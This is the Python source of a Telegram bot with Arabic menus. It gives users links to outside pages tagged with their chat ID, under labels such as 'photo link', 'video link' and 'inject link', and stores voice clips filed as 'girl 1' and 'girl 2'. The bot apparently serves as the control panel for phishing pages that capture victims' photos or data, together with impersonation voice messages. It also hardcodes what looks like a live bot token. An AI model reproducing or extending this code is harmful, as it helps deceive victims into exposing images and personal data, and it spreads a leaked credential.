import os
import json
import urllib3
import telebot
from telebot import types
from PIL import Image, PngImagePlugin
import threading
import http.server
import time
import yt_dlp

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = os.getenv("BOT_TOKEN", "8128965245:AAGolmLae3ALVga_kcloXCK2zsFRODK4BXc")
bot = telebot.TeleBot(BOT_TOKEN)

DB_FILE = "/tmp/voice_db.json"
PHOTO_PAGE_URL = "https://app-display.github.io/ca.html-chatld-/"
VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId"
IMAGE_EDIT_URL = "https://app-display.github.io/-c-om-Copy-Translate-ate-vel-.app-c.html-chatld-/"

user_states = {}
user_data = {}

# --- سيرفر Railway ---
def run_dummy_server():
    port = int(os.environ.get("PORT", 8080))
    httpd = http.server.HTTPServer(('', port), http.server.SimpleHTTPRequestHandler)
    httpd.serve_forever()

# --- إدارة قاعدة بيانات الأصوات ---
def load_db():
    if not os.path.exists(DB_FILE) or os.path.getsize(DB_FILE) == 0:
        return {"girl_1": {}, "girl_2": {}}
    with open(DB_FILE, 'r', encoding='utf-8') as f:
        try: return json.load(f)
        except: return {"girl_1": {}, "girl_2": {}}

def save_db(db):
    with open(DB_FILE, 'w', encoding='utf-8') as f:
        json.dump(db, f, indent=4, ensure_ascii=False)

# --- تحميل الفيديو المحدث ---
def download_video_sync(url, chat_id):
    try:
        ydl_opts = {
            'format': 'best[ext=mp4]/best',
            'outtmpl': f'/tmp/vid_{chat_id}.mp4',
            'quiet': True,
            'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
        }
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)
            return f"/tmp/vid_{chat_id}.mp4", info.get('title', 'Video')
    except Exception as e: return None, str(e)

# --- القوائم الأساسية ---
def get_main_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🖼️ رابط صور", callback_data="get_photo_link"),
        types.InlineKeyboardButton("🎥 رابط فيديو", callback_data="get_video_link"),
        types.InlineKeyboardButton("✨ رابط تعديل", callback_data="get_image_edit_link"),
        types.InlineKeyboardButton("📥 تحميل فيديو", callback_data="dl_video"),
        types.InlineKeyboardButton("🔒 حقن رابط", callback_data="inject_start"),
        types.InlineKeyboardButton("🎧 قسم الصوتيات", callback_data="voice_menu")
    )
    return markup

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    chat_id = call.message.chat.id
    db = load_db()
    
    if call.data == "dl_video":
        user_states[chat_id] = "waiting_for_url"
        bot.edit_message_text("أرسل رابط الفيديو الآن:", chat_id, call.message.message_id)
    elif call.data == "voice_menu":
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("👩 الفتاة 1", callback_data="girl_1_menu"),
                   types.InlineKeyboardButton("👩 الفتاة 2", callback_data="girl_2_menu"),
                   types.InlineKeyboardButton("🔙 عودة", callback_data="main_menu"))
        bot.edit_message_text("اختر المجلد:", chat_id, call.message.message_id, reply_markup=markup)
    
    # --- قسم الفتيات (منطقك الأصلي) ---
    elif call.data == "girl_1_menu":
        user_states[chat_id] = "active_girl_1"
        markup = types.InlineKeyboardMarkup(row_width=2)
        for i in range(1, 11):
            name = f"مقطع {i}"
            status = "🎵" if name in db["girl_1"] else "⚪"
            markup.add(types.InlineKeyboardButton(f"{status} {name}", callback_data=f"play_g1:{name}"))
        markup.add(types.InlineKeyboardButton("🔙 عودة", callback_data="voice_menu"))
        bot.edit_message_text("📂 مجلد الفتاة 1 (أرسل فويس لتحديث):", chat_id, call.message.message_id, reply_markup=markup)
    
    elif call.data == "girl_2_menu":
        user_states[chat_id] = "active_girl_2"
        markup = types.InlineKeyboardMarkup(row_width=2)
        for i in range(1, 14):
            name = f"مقطع {i}"
            status = "🎵" if name in db["girl_2"] else "⚪"
            markup.add(types.InlineKeyboardButton(f"{status} {name}", callback_data=f"play_g2:{name}"))
        markup.add(types.InlineKeyboardButton("🔙 عودة", callback_data="voice_menu"))
        bot.edit_message_text("📂 مجلد الفتاة 2 (أرسل فويس لتحديث):", chat_id, call.message.message_id, reply_markup=markup)
        
    elif call.data.startswith("play_g"):
        target = "girl_1" if "g1" in call.data else "girl_2"
        name = call.data.split(":")[1]
        fid = db[target].get(name)
        if fid: bot.send_voice(chat_id, fid)
        else: bot.answer_callback_query(call.id, "⚠️ فارغ!")
    
    # --- باقي الروابط ---
    elif call.data == "main_menu":
        bot.edit_message_text("🤖 القائمة الرئيسية:", chat_id, call.message.message_id, reply_markup=get_main_keyboard())
    elif call.data == "get_photo_link": bot.send_message(chat_id, f"{PHOTO_PAGE_URL}?chatId={chat_id}")
    bot.answer_callback_query(call.id)

@bot.message_handler(content_types=['voice', 'text', 'photo'])
def handle_media(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    
    # تحميل الفيديو
    if state == "waiting_for_url":
        status = bot.reply_to(message, "⏳ جاري التحميل...")
        path, title = download_video_sync(message.text, chat_id)
        if path:
            bot.send_video(chat_id, open(path, 'rb'), caption=title)
            bot.delete_message(chat_id, status.message_id)
            os.remove(path)
        else: bot.edit_message_text(f"❌ خطأ: {title}", chat_id, status.message_id)
        user_states[chat_id] = None
        
    # حفظ الصوتيات (المنطق الأصلي الخاص بك)
    elif message.voice and state in ["active_girl_1", "active_girl_2"]:
        db = load_db()
        target = "girl_2" if state == "active_girl_2" else "girl_1"
        max_s = 13 if target == "girl_2" else 10
        next_s = len(db[target]) + 1
        if next_s > max_s: db[target] = {}; next_s = 1
        db[target][f"مقطع {next_s}"] = message.voice.file_id
        save_db(db)
        bot.reply_to(message, f"✅ تم حفظ المقطع في {target}")

if __name__ == '__main__':
    threading.Thread(target=run_dummy_server, daemon=True).start()
    bot.polling(none_stop=True)
